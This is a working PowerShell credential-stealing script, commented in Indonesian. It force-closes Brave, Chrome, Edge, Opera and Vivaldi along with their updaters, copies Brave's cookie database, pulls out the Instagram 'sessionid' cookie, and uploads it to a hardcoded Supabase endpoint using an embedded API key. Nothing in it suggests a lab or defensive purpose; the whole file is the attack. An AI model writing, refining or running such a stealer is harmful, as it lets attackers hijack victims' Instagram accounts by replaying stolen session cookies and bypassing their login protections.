$SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
# PENTING: Ganti 'sessions' dengan nama tabel yang benar di Supabase kamu
$SUPABASE_TABLE = "sessions" 
$SUPABASE_ENDPOINT = "$SUPABASE_URL/rest/v1/$SUPABASE_TABLE"

$SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"

function Kill-BrowserProcesses {

    Write-Host "[*] Menghentikan seluruh proses browser dan service terkait..."

    $processNames = @(
        "brave", "chrome", "msedge", "opera", "vivaldi",
        "BraveUpdate", "GoogleUpdate", "edgeupdate",
        "crashpad_handler", "chrome_crashpad_handler"
    )
    foreach ($proc in $processNames) {
        Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Get-CimInstance Win32_Process -Filter "Name LIKE '%$proc%'" -ErrorAction SilentlyContinue | 
            Invoke-CimMethod -MethodName Terminate -ErrorAction SilentlyContinue | Out-Null
    }
    Start-Sleep -Seconds 3
}

function Save-To-Supabase {
    param ([string]$sessionId)

    try {
        Write-Host "[*] Menghubungkan ke Supabase..."
        
        # Headers harus spesifik ke endpoint REST, bukan root URL
        $headers = @{
            "apikey"        = $SUPABASE_KEY
            "Authorization" = "Bearer $SUPABASE_KEY"
            "Content-Type"  = "application/json"
            "Prefer"        = "return=minimal"
        }

        $body = @{
            "session" = $sessionId
        } | ConvertTo-Json

        # GUNAKAN $SUPABASE_ENDPOINT, BUKAN $SUPABASE_URL
        $response = Invoke-RestMethod -Uri $SUPABASE_ENDPOINT -Method Post -Headers $headers -Body $body
        
        Write-Host "[✓] Berhasil menyimpan Session ID ke Supabase!"
    }
    catch {
        Write-Host "[!] Gagal menyimpan ke Supabase: $_"
        # Debugging: lihat detail error jika gagal
        # Write-Host $error[0]
    }
}

function Get-InstagramSession {
    Kill-BrowserProcesses

    # Cari lokasi database cookie Brave
    $possiblePaths = @(
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Cookies"
    )

    $dbPath = $null
    foreach ($path in $possiblePaths) {
        if (Test-Path $path) {
            $dbPath = $path
            break
        }
    }

    if (-not $dbPath) {
        Write-Host "[!] File database cookie Brave tidak ditemukan."
        return
    }

    $tempDb = "$env:TEMP\brave_cookies_temp.db"
    
    # Salin file menggunakan FileStream dengan FileShare.ReadWrite
    try {
        $sourceStream = New-Object System.IO.FileStream($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $destStream = New-Object System.IO.FileStream($tempDb, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        
        $sourceStream.CopyTo($destStream)
        
        $destStream.Close()
        $sourceStream.Close()
    }
    catch {
        Write-Host "[!] Gagal menyalin file database: $_"
        return
    }

    Write-Host "[*] Membaca database cookie Brave..."
    try {
        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
        $text = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($bytes)
        
        # Regex untuk mencari sessionid
        if ($text -match 'sessionid\x00([^\x00\r\n\t]+)') {
            $rawSession = $Matches[1]
            # Bersihkan karakter non-ASCII yang mungkin terbawa
            $sessionIdVal = $rawSession -replace '[^\w%:-]', ''
            
            Write-Host ("=" * 65)
            Write-Host "INSTAGRAM SESSIONID BERHASIL DI-EKSTRAKSI:"
            Write-Host ("=" * 65)
            Write-Host $sessionIdVal
            Write-Host ("=" * 65)`n

            Save-To-Supabase -sessionId $sessionIdVal
        }
        else {
            Write-Host "`n[!] Cookie 'sessionid' Instagram tidak ditemukan."
        }
    }
    finally {
        # Bersihkan file temp
        if (Test-Path $tempDb) {
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        }
    }
}

# Jalankan fungsi
Get-InstagramSession
